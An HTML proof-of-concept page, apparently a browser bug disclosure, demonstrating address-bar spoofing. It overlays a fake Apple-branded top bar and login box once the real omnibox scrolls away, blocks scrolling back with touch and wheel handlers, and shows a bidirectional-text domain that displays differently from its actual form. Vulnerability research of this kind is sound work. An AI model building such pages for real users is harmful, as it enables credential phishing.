<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Brave Omnibox PoC</title>

<style>

*{
    box-sizing:border-box;
}

html,body{
    margin:0;
    padding:0;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
    background:#f5f5f7;
    color:#111;
}

body{
    height:3000px;
}

/* Intro */

.hero{
    max-width:700px;
    margin:auto;
    padding:50px 24px;
}

.hero h1{
    font-size:34px;
    margin:0 0 14px;
}

.hero p{
    font-size:17px;
    line-height:1.7;
    color:#555;
}

/* Fake top UI */

#topLogo{
    position:fixed;
    top:0;
    left:0;
    width:100%;
    height:58px;
    background:white;
    display:none;
    z-index:9999;
    border-bottom:1px solid #e5e5e5;
    box-shadow:0 2px 8px rgba(0,0,0,0.06);

    display:none;
    align-items:center;
    justify-content:center;
}

#topLogo img{
    height:22px;
    width:auto;
    object-fit:contain;
}

/* Overlay */

#loginPage{
    position:absolute;
    left:0;
    width:100%;
    display:none;
    z-index:9998;
    padding:100px 20px;
}

.login-box{
    width:100%;
    max-width:420px;
    margin:auto;
    background:white;
    border-radius:22px;
    padding:30px;
    box-shadow:
        0 10px 25px rgba(0,0,0,0.08),
        0 2px 8px rgba(0,0,0,0.04);
}

.badge{
    display:inline-block;
    padding:7px 12px;
    border-radius:999px;
    background:#eef2ff;
    color:#4338ca;
    font-size:13px;
    font-weight:600;
    margin-bottom:18px;
}

.login-box h2{
    margin:0;
    font-size:26px;
    line-height:1.3;
}

.domain{
    margin-top:18px;
    padding:16px;
    border-radius:14px;
    background:#f3f4f6;
    border:1px solid #e5e7eb;
    font-size:14px;
    line-height:1.8;
    word-break:break-word;
}

.highlight{
    color:#dc2626;
    font-weight:700;
}

</style>
</head>

<body>

<div class="hero">

    <h1>Confusion AddressBar PoC</h1>

    <p>
        Scroll until the omnibox disappears.
    </p>

</div>

<div id="topLogo">
    <img src="apple-logo.png">
</div>

<div id="loginPage">

    <div class="login-box">

        <input>

        <div class="badge">
            UI Redressing Demo
        </div>

        <h2>
            Omnibox Confusion
        </h2>

        <div class="domain">

            <span class="highlight">
                Actual:
            </span>

            <br><br>

            ا.login.apple.com.ا.google.com.poczephyrus.my.id

            <br><br>

            <span class="highlight">
                Displayed:
            </span>

            <br><br>

            google.com.poczephyrus.my.id.ا.login.apple.com.ا

        </div>

    </div>

</div>

<script>

let startY = 0;
let blockUp = false;

setTimeout(function(){

    blockUp = true;

    let login = document.getElementById("loginPage");
    let logo = document.getElementById("topLogo");

    login.style.top = window.scrollY + "px";
    login.style.display = "block";

    logo.style.display = "flex";

},5000);


document.addEventListener("touchstart", function(e){
    startY = e.touches[0].clientY;
}, {passive:false});

document.addEventListener("touchmove", function(e){

    if(!blockUp) return;

    e.preventDefault();

}, {passive:false});


document.addEventListener("wheel", function(e){

    if(!blockUp) return;

    e.preventDefault();

}, {passive:false});

</script>

</body>
</html>
